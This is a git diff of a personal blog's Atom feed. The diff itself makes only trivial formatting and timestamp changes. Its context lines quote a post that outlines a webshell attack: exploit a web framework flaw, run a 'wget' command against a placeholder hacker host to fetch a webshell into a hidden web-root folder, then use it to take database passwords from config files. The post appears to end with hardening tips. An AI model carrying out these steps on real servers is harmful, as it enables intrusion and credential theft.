@@ -4,7 +4,7 @@
   <title><![CDATA[Category: 安全 | ChandleWEi's Blog]]></title>
   <link href="http://ChandleWEi.github.io/blog/categories/an-quan/atom.xml" rel="self"/>
   <link href="http://ChandleWEi.github.io/"/>
-  <updated>2014-02-17T12:51:33+08:00</updated>
+  <updated>2014-02-17T14:08:06+08:00</updated>
   <id>http://ChandleWEi.github.io/</id>
   <author>
     <name><![CDATA[Chandler Wei]]></name>
@@ -24,13 +24,13 @@
 
 <p>1、利用web框架漏洞取得webshell；（至于是什么漏洞这里就不抖露。）</p>
 
-<p>2、上传后门代码方法之一：wget htt://xx.heike.com/webshell.txt;  mv webshell.txt  /wwwroot/.xx/xxx.[html/jsp/asp&hellip;.]；</p>
+<p>2、上传后门代码方法之一：wget htt://xx.heike.com/webshell.txt;  mv webshell.txt  /wwwroot/.xx/xxx.[html/jsp/asp….]；</p>
 
 <p>3、www调用该页面，取得服务级用户权限，并查找架构配置文件和其中的数据库用户密码；</p>
 
 <p>       网上有个现成的jsp脚本，截个图大家看看：</p>
 
-<p>      <a href="http://hiadmin.com/wp-content/uploads/2011/04/3.jpg"> <img src="http://hiadmin.com/wp-content/uploads/2011/04/3-300x106.jpg" title="3" alt="" /> </a></p>
+<p>      <a href="http://hiadmin.com/wp-content/uploads/2011/04/3.jpg"> <img src="http://hiadmin.com/wp-content/uploads/2011/04/3-300x106.jpg" alt="" title="3" /> </a></p>
 
 <p>      详细功能可查看： <a href="http://blog.csdn.net/kj021320/archive/2006/10/09/1327908.aspx" title="jsp管理系统">jsp管理系统</a></p>
 
@@ -81,6 +81,7 @@
 <p>       6）熟悉selinux的 enforce起来；</p>
 
 <p>晚上辗转反侧睡不着，自己琢磨的。</p>
+
 ]]></content>
   </entry>
   
